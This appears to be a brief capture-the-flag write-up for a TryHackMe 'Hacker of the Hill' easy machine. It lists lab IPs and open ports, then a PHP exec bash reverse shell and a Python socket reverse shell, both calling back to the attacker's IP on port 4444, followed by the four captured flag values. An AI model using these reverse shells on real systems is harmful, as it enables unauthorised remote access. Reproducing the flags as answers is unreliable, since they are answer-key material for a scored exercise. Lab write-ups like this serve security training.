# Hacker_of_the_Hill 

> VOiD | Wednesday 29 December 2021 04:44:19 PM UTC

My IP : 10.8.253.221

## H1: Easy
Target IP :  10.10.118.89

```bash
Open 10.10.118.89:22
Open 10.10.118.89:80
```


## PORT 8002 [http]
```bash
http://10.10.118.89:8002/lesson/1
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1'");

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Flag 1 :
root@web-serv:/var/www# cat /usr/games/fortune | base64 -d
THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
"BACK2THM{a77bc034424d18cc07567eb79c5e205c}"

Flag 2 :
THM{Bet_You're_Glad_This_Is_Not_A_Hash}
"BACK2THM{84c31ff2c6f1b3b793fb919dc19ebbb7}"

Flag 3 :
root@web-serv:/var/www/serv4# cat index.php 
THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
"BACK2THM{a55609830258a3e1eac9123812b9c68b}"

Flag 4 :
root@web-serv:~# cat root.txt 
THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
"BACK2THM{ff315ec593432fb5d85726c34530c5c6}"

```
